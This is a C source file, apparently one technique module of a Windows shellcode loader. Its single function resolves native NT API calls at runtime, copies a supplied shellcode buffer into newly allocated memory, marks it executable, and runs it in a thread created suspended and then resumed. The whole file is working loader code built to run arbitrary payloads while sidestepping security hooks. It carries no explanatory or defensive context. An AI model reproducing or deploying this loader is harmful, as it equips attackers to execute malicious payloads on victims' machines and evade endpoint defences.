#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_nt_suspended(unsigned char *sc, size_t len) {
    fnNtAllocateVirtualMemory pAlloc =
        (fnNtAllocateVirtualMemory)ntapi_resolve("NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory pProtect =
        (fnNtProtectVirtualMemory)ntapi_resolve("NtProtectVirtualMemory");
    fnNtCreateThreadEx pThread =
        (fnNtCreateThreadEx)ntapi_resolve("NtCreateThreadEx");
    fnNtWaitForSingleObject pWait =
        (fnNtWaitForSingleObject)ntapi_resolve("NtWaitForSingleObject");
    if (!pAlloc || !pProtect || !pThread || !pWait) return FALSE;

    PVOID base = NULL;
    SIZE_T sz = len;
    if (!NT_SUCCESS(pAlloc((HANDLE)-1, &base, 0, &sz,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;

    memcpy(base, sc, len);

    ULONG old = 0;
    sz = len;
    pProtect((HANDLE)-1, &base, &sz, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = NULL;
    if (!NT_SUCCESS(pThread(&hThread, THREAD_ALL_ACCESS, NULL,
                            (HANDLE)-1, base, NULL, 0x1, 0, 0, 0, NULL)))
        return FALSE;

    ResumeThread(hThread);
    pWait(hThread, FALSE, NULL);
    CloseHandle(hThread);
    return TRUE;
}
